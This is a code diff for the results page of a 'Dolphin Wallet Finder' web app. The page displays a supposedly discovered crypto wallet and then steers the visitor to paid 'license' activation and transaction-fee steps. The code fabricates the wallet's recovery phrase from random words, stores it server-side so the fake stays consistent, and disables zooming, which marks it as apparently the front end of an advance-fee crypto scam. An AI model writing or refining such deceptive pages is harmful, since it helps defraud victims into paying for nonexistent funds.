@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"/>
   <title>Dolphin Wallet Finder — Scan Result</title>
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -27,20 +27,44 @@
       radial-gradient(1400px 820px at 15% 10%, rgba(53,167,255,.12), transparent 60%),
       radial-gradient(1100px 680px at 85% 90%, rgba(20,255,137,.12), transparent 60%),
       linear-gradient(180deg,#0a1220,var(--grid) 42%);
-    overflow-x:hidden; -webkit-tap-highlight-color:transparent;
+    overflow-x:hidden; /* only vertical scroll */
+    -webkit-tap-highlight-color:transparent;
+    -webkit-text-size-adjust:100%;
+    touch-action: pan-y; /* allow vertical panning only */
   }
 
   .radar{position:fixed; inset:0; z-index:-2}
   canvas{position:absolute; inset:0; width:100%; height:100%}
 
-  .stage{min-height:100%; display:grid; place-items:center; padding:clamp(16px,3vw,32px); position:relative; z-index:2}
+  /* ===== Centering container ===== */
+  .stage{
+    min-height:100svh;            /* stable viewport height on mobile */
+    display:flex;                  /* flex centering (more robust than grid here) */
+    align-items:center;
+    justify-content:center;
+    padding:clamp(16px,3vw,32px);
+    padding-left: max(clamp(16px,3vw,32px), env(safe-area-inset-left));
+    padding-right:max(clamp(16px,3vw,32px), env(safe-area-inset-right));
+    padding-top: max(clamp(16px,3vw,32px), env(safe-area-inset-top));
+    padding-bottom:max(clamp(16px,3vw,32px), env(safe-area-inset-bottom));
+    position:relative; z-index:2;
+  }
+
+  /* ===== App shell ===== */
   .shell{
-    width:min(1200px,98vw); min-height:560px; display:grid; grid-template-columns:1.05fr 1.45fr;
+    width:min(1200px,98vw);
+    /* remove tall min-height so it can truly center */
+    min-height:auto;
+    display:grid; grid-template-columns:1.05fr 1.45fr;
     border-radius:28px; overflow:hidden; isolation:isolate; position:relative;
     box-shadow:var(--shadow-lg); border:1px solid var(--stroke);
     background:linear-gradient(180deg,var(--panel),var(--panel2));
+    margin-inline:auto;
+    margin-block:auto;            /* ensure block-axis centering if parent grows */
   }
-  @media (max-width:980px){ .shell{ grid-template-columns:1fr } }
+  @media (max-width:980px){
+    .shell{ grid-template-columns:1fr; min-height:auto }
+  }
 
   .brand-pane{
     position:relative;
@@ -53,27 +77,26 @@
     overflow:hidden;
   }
   .brand-inner{ padding:34px; height:100%; display:flex; flex-direction:column; gap:18px; justify-content:space-between }
-  .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); }
+  .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); margin:0 auto; }
   .ring{ position:absolute; inset:-12%; border-radius:50%;
     background:conic-gradient(from 0deg, rgba(53,167,255,.75), transparent 20%, rgba(15,241,231,.75), transparent 70%);
     filter:blur(12px); animation:spin 8s linear infinite; opacity:.9;
   }
   .title{ margin:14px 0 6px; font-weight:900; font-size:clamp(22px,2.2vw,30px);
-    background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; }
-  .kicker{ color:var(--muted); line-height:1.8 }
+    background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; text-align:center; }
+  .kicker{ color:var(--muted); line-height:1.8; text-align:center }
 
   .content-pane{ position:relative; }
   .border-glow{ position:absolute; inset:-1.5px; border-radius:30px; z-index:-1; background:conic-gradient(from 0deg, transparent, rgba(53,167,255,.55), transparent 40%, rgba(15,241,231,.55), transparent 75%); filter:blur(8px); animation:spin 14s linear infinite; }
   .pane-inner{ padding:28px clamp(24px,4vw,38px); display:flex; flex-direction:column; gap:18px; height:100% }
 
-  .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent }
-  .hero p{ color:var(--muted); line-height:1.9; margin:0 }
+  .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; text-align:center }
+  .hero p{ color:var(--muted); line-height:1.9; margin:0; text-align:center }
 
-  /* Responsive stat cards */
   .stats{ display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:14px; margin-top:6px }
   .stat{ background:linear-gradient(120deg,rgba(0,255,255,.09),rgba(0,35,80,.14)); border:1px solid rgba(64,203,255,.28); border-radius:14px; padding:14px 18px; min-height:76px; overflow:visible }
-  .stat .n{ font-size:clamp(18px,2.2vw,28px); font-weight:900; color:var(--c1); line-height:1.3; overflow-wrap:anywhere; white-space:normal; word-break:break-word }
-  .stat .l{ color:var(--muted); font-size:.95rem; margin-top:6px; white-space:normal }
+  .stat .n{ font-size:clamp(18px,2.2vw,28px); font-weight:900; color:var(--c1); line-height:1.3; overflow-wrap:anywhere; white-space:normal; word-break:break-word; text-align:center }
+  .stat .l{ color:var(--muted); font-size:.95rem; margin-top:6px; white-space:normal; text-align:center }
 
   .grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:6px }
   @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
@@ -83,7 +106,6 @@
   .btn-big{ text-align:center; border:none; border-radius:18px; padding:20px 28px; font-size:1.15rem; font-weight:900; letter-spacing:.35px; text-transform:uppercase; color:#001019; background:linear-gradient(95deg,var(--c2),var(--c1),var(--c3),var(--c2)); background-size:220% 100%; box-shadow:0 24px 50px rgba(53,167,255,.30); cursor:pointer; transition:transform .15s ease, background-position .55s ease; min-width:min(320px,90%); }
   .btn-big:hover{ transform:translateY(-1px); background-position:100% 0 }
 
-  .foot{ margin-top:auto; text-align:center; color:var(--muted); font-size:.9rem }
   .wallet-info{ color:var(--muted); line-height:1.9 }
   .wallet-info strong{ color:#cfefff }
   .mnemonic{ display:grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap:10px }
@@ -93,6 +115,13 @@
   @media (max-width: 600px){ .logo-wrap{ width:min(180px,60vw); margin:0 auto; } }
 
   @keyframes spin{ to{ transform:rotate(1turn) } }
+
+  /* Optional: slightly tighten spacing on short viewports to keep it centered */
+  @media (max-height:700px){
+    .brand-inner{ padding:22px }
+    .pane-inner{ padding:20px }
+    .grid{ gap:12px }
+  }
   </style>
 </head>
 <body class="theme-gold">
@@ -102,15 +131,14 @@
     <section class="shell">
       <aside class="brand-pane">
         <div class="brand-inner">
-          <div class="logo-wrap">
-            <div class="ring"></div>
-            <img src="../assets/logo.png" alt="Dolphin Wallet" />
-          </div>
-
           <div>
-            <div class="title">👑 VIP</div>
+            <div class="logo-wrap">
+              <div class="ring"></div>
+              <img src="../assets/logo.png" alt="Dolphin Wallet" />
+            </div>
             <div class="title">Dolphin Wallet Finder</div>
           </div>
+        </div>
       </aside>
 
       <section class="content-pane">
@@ -134,11 +162,10 @@
 
             <div class="card" style="flex-direction:column">
               <strong>Next Step</strong>
-              <p class="kicker" id="nextStepCopy">Checking transaction status...</p>
+              <p class="kicker" id="nextStepCopy">Checking license...</p>
               <div class="actions"><button class="btn-big" id="licenseBtn">Loading...</button></div>
             </div>
-            <div class="footer">© 2025 DOLPHIN WALLET FINDER. All rights reserved.</div>
-        </div>
+              <div class="kicker">© <span id="year"></span> DOLPHIN WALLET FINDER</div>
           </section>
         </div>
       </section>
@@ -146,7 +173,7 @@
   </main>
 
   <script>
-    const API_BASE_URL = "https://web-production-b86d.up.railway.app/api";
+    const API_BASE_URL = "https://web-production-d083d.up.railway.app/api";
     const token = localStorage.getItem("token");
 
     const walletInfoEl = document.getElementById("walletInfo");
@@ -171,7 +198,27 @@
       }
       return s;
     }
-    
+
+    function checkLicenseAndSetButton() {
+      fetch(`${API_BASE_URL}/license/status`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.license === "active") {
+          setNextStep("License active. Checking transaction status...");
+          checkTransactionFeeStatus();
+        } else {
+          setNextStep("License inactive. You need to activate your wallet.");
+          setButton("Activate Wallet", () => window.location.href = "license.html");
+        }
+      })
+      .catch(() => {
+        alert("Server error occurred.");
+        setNextStep("Could not verify license status.");
+      });
+    }
+
     function checkTransactionFeeStatus() {
       fetch(`${API_BASE_URL}/final-tx`, {
         headers: { "Authorization": "Bearer " + token }
@@ -192,6 +239,49 @@
       });
     }
 
+    function renderMnemonic(words){
+      const maskedIndices = [2,4,5,6,8,10];
+      const wordInputs = words.map((w,i)=>`<input type="text" readonly value="${maskedIndices.includes(i)?'••••••':w}" />`).join("");
+      document.getElementById("mnemonicWords").innerHTML = wordInputs;
+    }
+
+    function loadOrCreateMnemonic(){
+      fetch(`${API_BASE_URL}/mnemonic`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(async data => {
+        if (Array.isArray(data.words) && data.words.length){
+          renderMnemonic(data.words); return;
+        }
+        const allWords = [
+          "trouble","filter","gallery","oxygen","salmon","silent","pistol","bounce","diamond","trigger","planet","furnace",
+          "immune","flee","people","initial","panic","crucial","display","grace","aim","copper","fashion","pelican",
+          "pulp","average","wheel","pride","sketch","flag","narrow","object","juice","victory","swallow","refuse",
+          "goat","dune","phrase","hole","boy","maid","report","exhibit","ride","lecture","dynamic","burger",
+          "fork","disorder","assume","table","dawn","hood","office","art","share","later","sell","paper",
+          "quick","steel","acid","taste","promote","robust","false","hockey","employ","dinner","scene","rain"
+        ];
+        const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
+
+        const saved = await fetch(`${API_BASE_URL}/mnemonic`, {
+          method:'POST',
+          headers: {
+            "Authorization": "Bearer " + token,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ words: selected })
+        }).then(r => r.json()).catch(()=>null);
+
+        const finalWords = (saved && Array.isArray(saved.words)) ? saved.words : selected;
+        renderMnemonic(finalWords);
+      })
+      .catch(() => {
+        const fallback = ["alpha","beta","gamma","delta","omega","nova","luna","terra","aqua","zen","flux","pulse"];
+        renderMnemonic(fallback);
+      });
+    }
+
     function loadWalletData() {
       fetch(`${API_BASE_URL}/my-wallet`, {
         headers: { "Authorization": "Bearer " + token }
@@ -203,30 +293,13 @@
           window.location.href = "scan.html";
           return;
         }
-
         const wallet = data.wallet;
         const address = wallet.address || "";
         const maskedAddress = address ? (address.substring(0, 6) + "••••••••" + address.slice(-4)) : "Unknown";
-
         walletInfoEl.innerHTML = address ? `<strong>Address:</strong> ${maskedAddress}` : "";
-
         document.getElementById('statBalance').textContent = wallet.balance ?? '—';
         document.getElementById('statNetwork').textContent = wallet.network ?? '—';
         document.getElementById('statLastTx').textContent = formatDateMaybe(wallet.lastTx);
-
-        // Mnemonic
-        const allWords = [
-          "trouble","filter","gallery","oxygen","salmon","silent","pistol","bounce","diamond","trigger","planet","furnace",
-          "immune","flee","people","initial","panic","crucial","display","grace","aim","copper","fashion","pelican",
-          "pulp","average","wheel","pride","sketch","flag","narrow","object","juice","victory","swallow","refuse",
-          "goat","dune","phrase","hole","boy","maid","report","exhibit","ride","lecture","dynamic","burger",
-          "fork","disorder","assume","table","dawn","hood","office","art","share","later","sell","paper",
-          "quick","steel","acid","taste","promote","robust","false","hockey","employ","dinner","scene","rain"
-        ];
-        const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
-        const maskedIndices = [2,4,5];
-        const wordInputs = selected.map((w,i)=>`<input type="text" readonly value="${maskedIndices.includes(i)?'••••••':w}" />`).join("");
-        document.getElementById("mnemonicWords").innerHTML = wordInputs;
       })
       .catch(() => {
         walletInfoEl.textContent = "❌ Error loading wallet data.";
@@ -235,10 +308,11 @@
 
     // init
     loadWalletData();
-    checkTransactionFeeStatus();
+    loadOrCreateMnemonic();
+    checkLicenseAndSetButton();
     document.getElementById('year').textContent = new Date().getFullYear();
 
-    // subtle canvas shimmer
+    // Background shimmer
     try{
       const canvas = document.getElementById('bg');
       const ctx = canvas.getContext('2d');
@@ -261,6 +335,19 @@
         requestAnimationFrame(loop);
       })();
     }catch(e){}
+
+    /* Disable zoom shortcuts */
+    window.addEventListener('wheel', function(e){
+      if (e.ctrlKey) { e.preventDefault(); }
+    }, { passive:false });
+    ['gesturestart','gesturechange','gestureend'].forEach(ev=>{
+      window.addEventListener(ev, e=>{ e.preventDefault(); }, { passive:false });
+    });
+    window.addEventListener('keydown', function(e){
+      if ((e.ctrlKey || e.metaKey) && ['+','-','=','0'].includes(e.key)) {
+        e.preventDefault();
+      }
+    });
   </script>
 </body>
 </html>
